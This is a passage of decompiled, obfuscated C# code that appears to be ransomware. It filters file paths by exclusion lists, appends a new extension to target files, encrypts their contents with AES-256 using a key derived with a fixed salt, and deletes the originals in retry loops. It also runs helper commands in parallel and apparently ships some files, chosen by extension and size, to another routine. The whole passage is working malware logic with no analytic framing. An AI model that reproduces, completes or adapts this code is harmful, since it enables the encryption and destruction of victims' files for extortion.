!CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389524)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389531)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389482)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389497)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389448)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389431)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389446)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389397)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389412)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389367)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389378)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389333)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389320)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107388791)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107388806)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107388757))) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107388764)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107397220)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107388719)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(CS_0024_003C_003E8__locals0.ApXJMbmTnc) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388694)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388689)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388684)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388711)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107388706)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(vyePyvbVLbeEqa) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(ZmxznfzcMXVgTR) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(xrvDxaCBctsjEXT))
			{
				if (CS_0024_003C_003E8__locals0.fFnbbgAKLY.Length != 0)
				{
					string[] fFnbbgAKLY = CS_0024_003C_003E8__locals0.fFnbbgAKLY;
					int num = 0;
					while (num < fFnbbgAKLY.Length)
					{
						string value = fFnbbgAKLY[num];
						if (!CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(CS_0024_003C_003E8__locals0.ApXJMbmTnc))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!kQacklGScvGB.Contains(CS_0024_003C_003E8__locals0.HDYHoqvFVoE))
				{
					if (VtgyThVicrA == VQdrzQouGeJmOOKE.getString_0(107396791))
					{
						try
						{
							if (zGtpjDKaRKnN.xfoUezvsOShUpjR(CS_0024_003C_003E8__locals0.HDYHoqvFVoE))
							{
								zGtpjDKaRKnN.kXZHKHEOIChOkFR(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
							}
						}
						catch
						{
						}
					}
					kQacklGScvGB.Add(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					if (!XhCnheiZHlf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HDYHoqvFVoE)))
					{
						XhCnheiZHlf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HDYHoqvFVoE));
					}
					TUNusUrhcyiCD(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					try
					{
						new qxmBSGuDUn().BIKmJflQUBqn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (zZWgofEFsLDUuOW)
								{
									Console.WriteLine(VQdrzQouGeJmOOKE.getString_0(107402554) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107402477) + new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length + VQdrzQouGeJmOOKE.getString_0(107402488));
									Console.WriteLine(VQdrzQouGeJmOOKE.getString_0(107402447));
								}
							}
							catch
							{
							}
							rNfIJaiTMyCx(hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402886)), VQdrzQouGeJmOOKE.getString_0(107388590) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107388590) + hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402829)) + VQdrzQouGeJmOOKE.getString_0(107388590) + Environment.UserName + VQdrzQouGeJmOOKE.getString_0(107388590) + hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402844)));
						}
					}
					catch (Exception ex2)
					{
						if (YGBzDBzlDVGPdcyT)
						{
							try
							{
								File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107402819) + ex2.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (YGBzDBzlDVGPdcyT)
							{
								try
								{
									File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107402706) + ex4.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
								}
								catch (Exception)
								{
								}
							}
							IwoWsCVOvNqeRACr++;
							goto end_IL_085c_2;
						}
						if (DVGbUCJGnq == VQdrzQouGeJmOOKE.getString_0(107396791) && new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length > Convert.ToInt32(kituZbADEtf) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
								{
									if (izNvindkdEa)
									{
										CS_0024_003C_003E8__locals0.ApXJMbmTnc = PDiDpTsAaoZu + CS_0024_003C_003E8__locals0.ApXJMbmTnc;
									}
									File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc);
								}
							}
							catch (Exception ex6)
							{
								if (YGBzDBzlDVGPdcyT)
								{
									try
									{
										File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107402645) + ex6.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
									}
									catch (Exception)
									{
									}
								}
								IwoWsCVOvNqeRACr++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
							{
								CS_0024_003C_003E8__locals0.HDYHoqvFVoE += CS_0024_003C_003E8__locals0.ApXJMbmTnc;
							}
							if (KsYUZJCeItFet == VQdrzQouGeJmOOKE.getString_0(107396791))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in rSxQCGHPFw)
									{
										if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107396797))
										{
											if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length)
											{
												try
												{
													PRbKLyXwxCMy.KUjtevBxHIDiZB(VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390425), VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390420), VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390439), CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().EndsWith(item3) && BTmYNKJoWXy == VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107397086))
										{
											try
											{
												PRbKLyXwxCMy.KUjtevBxHIDiZB(VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390425), VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390420), VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO.getString_0(107390439), CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
							string text2 = VQdrzQouGeJmOOKE.getString_0(107390370);
							text2 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : VQdrzQouGeJmOOKE.getString_0(107390370));
							string s = pmEBRznCyJCsrx.otEPbnvZbIA(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (uZGrkbWLHwtb == VQdrzQouGeJmOOKE.getString_0(107397080))
							{
								byte[] array = null;
								byte[] byte_ = PywWzStJmnOP.qDPulRCUpTwRa(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, Convert.ToInt32(kituZbADEtf) * 1024 * 1024);
								if (!PywWzStJmnOP.eZPzeLHBKntVHTM(VfjTsBqJDSVT: (!ToytCwhuOZ) ? (TTTJwfHUqgyKmj ? PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.aVkwyftWjF), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TTTJwfHUqgyKmj ? LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.aVkwyftWjF), Convert.FromBase64String(UQzJrkNAgAyNPg))), eDBBwAsYeVCx: CS_0024_003C_003E8__locals0.HDYHoqvFVoE, EeTyBkmkZsu: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!TTTJwfHUqgyKmj)
							{
								if (!xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, kituZbADEtf, CS_0024_003C_003E8__locals0.aVkwyftWjF, null, Convert.FromBase64String(UQzJrkNAgAyNPg)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, kituZbADEtf, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (izNvindkdEa)
							{
								CS_0024_003C_003E8__locals0.ApXJMbmTnc = PDiDpTsAaoZu + CS_0024_003C_003E8__locals0.ApXJMbmTnc;
							}
							string text3 = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
							string text4 = VQdrzQouGeJmOOKE.getString_0(107390370);
							text4 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : VQdrzQouGeJmOOKE.getString_0(107390370));
							string s2 = pmEBRznCyJCsrx.otEPbnvZbIA(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
							{
								if (!lMzMCwfLjdb)
								{
									if (!TTTJwfHUqgyKmj)
									{
										tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, ZWfNLTTCJEsBadr);
									}
									else
									{
										tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!TTTJwfHUqgyKmj)
										{
											xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
										}
										else
										{
											xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (YGBzDBzlDVGPdcyT)
										{
											try
											{
												File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107386085) + ex11.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
											}
											catch (Exception)
											{
											}
										}
										IwoWsCVOvNqeRACr++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!lMzMCwfLjdb)
							{
								if (!TTTJwfHUqgyKmj)
								{
									tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107386062), ZWfNLTTCJEsBadr);
								}
								else
								{
									tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107386062), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!TTTJwfHUqgyKmj)
									{
										xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
									}
									else
									{
										xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (YGBzDBzlDVGPdcyT)
									{
										try
										{
											File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + VQdrzQouGeJmOOKE.getString_0(107386085) + ex14.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
										}
										catch (Exception)
										{
										}
									}
									IwoWsCVOvNqeRACr++;
									return;
								}
							}
							if (TTTJwfHUqgyKmj)
							{
								if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
								{
									TnxDxZQzabkSS(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + CS_0024_003C_003E8__locals0.ApXJMbmTnc, bytes2);
								}
								else
								{
									TnxDxZQzabkSS(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			CS_0024_003C_003E8__locals0.fUBdEKZyHcMt.Remove(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
		});
	}

	private static void fqcATKsWDYj(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (KsYUZJCeItFet == getString_0(107396771))
					{
						foreach (string item in rSxQCGHPFw)
						{
							if (string_0.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107396771))
							{
								if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107397060))
							{
								try
								{
									PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386042)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386042), getString_0(107390350)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void xupzWdtCvyjPfw(string VJIvmEETGlMO, string pikEBqlxdcLv, byte[] mPEhxVnpGlTsLL, byte[] ZRkixbGqsGE = null)
	{
		try
		{
			if (KsYUZJCeItFet == getString_0(107396771))
			{
				FileStream fileStream = new FileStream(VJIvmEETGlMO, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in rSxQCGHPFw)
				{
					if (VJIvmEETGlMO.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107396771))
					{
						if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), VJIvmEETGlMO);
							}
							catch
							{
							}
						}
					}
					else if (VJIvmEETGlMO.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107397060))
					{
						try
						{
							PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), VJIvmEETGlMO);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (VJIvmEETGlMO != pikEBqlxdcLv)
		{
			File.Move(VJIvmEETGlMO, pikEBqlxdcLv);
			VJIvmEETGlMO = pikEBqlxdcLv;
		}
		byte[] bytes = LQKLndoDiyu.GrlNceGkOvk(File.ReadAllBytes(VJIvmEETGlMO), mPEhxVnpGlTsLL, ZRkixbGqsGE);
		File.WriteAllBytes(VJIvmEETGlMO, bytes);
		OSqubFtEdkqhb++;
	}

	private static void tjNNgredhuoLn(string string_0, string string_1, byte[] byte_0)
	{
		wTSZYsFYaqEX CS_0024_003C_003E8__locals0 = new wTSZYsFYaqEX();
		CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz = string_0;
		CS_0024_003C_003E8__locals0.MczmtGUvSer = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string mczmtGUvSer = CS_0024_003C_003E8__locals0.MczmtGUvSer;
			FileStream fileStream = new FileStream(mczmtGUvSer, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (cAsAngUTSsddb == getString_0(107396771))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.MczmtGUvSer.Length > 0)
				{
					if (KsYUZJCeItFet == getString_0(107396771))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in rSxQCGHPFw)
						{
							if (CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107396771))
							{
								if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107397060))
							{
								try
								{
									PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.MczmtGUvSer.EndsWith(getString_0(107386042)))
					{
						File.Move(CS_0024_003C_003E8__locals0.MczmtGUvSer, CS_0024_003C_003E8__locals0.MczmtGUvSer.Replace(getString_0(107386042), getString_0(107390350)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.MczmtGUvSer))
							{
								File.Delete(CS_0024_003C_003E8__locals0.MczmtGUvSer);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386819) + CS_0024_003C_003E8__locals0.ayhKFIQnjViRHWz + getString_0(107386065) + ex2.Message + getString_0(107396570));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = ukNYLlmoXdw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385980)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source2 = rLiTvUnMjZIoe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385999)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (RrsXTdLJJRIMoA == getString_0(107396771))
		{
			string[] bBUuyXfOREW = BBUuyXfOREW;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385999)), getString_0(107386454) + string_0 + getString_0(107386477));
				};
			}
			Parallel.ForEach(bBUuyXfOREW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!PAnwnUZwtskZZp().Contains(getString_0(107386173)))
		{
			COmUeYeonfEGhi(czSpNgGzTRaL);
		}
		else
		{
			List<string> dOqIFjuGCgghi = DOqIFjuGCgghi;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					rNfIJaiTMyCx(hcAHXMuOvto(BSskXttzziY(getString_0(107386472))), string_0);
				};
			}
			Parallel.ForEach(dOqIFjuGCgghi, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> fxMScNAmcodLPVv = FxMScNAmcodLPVv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
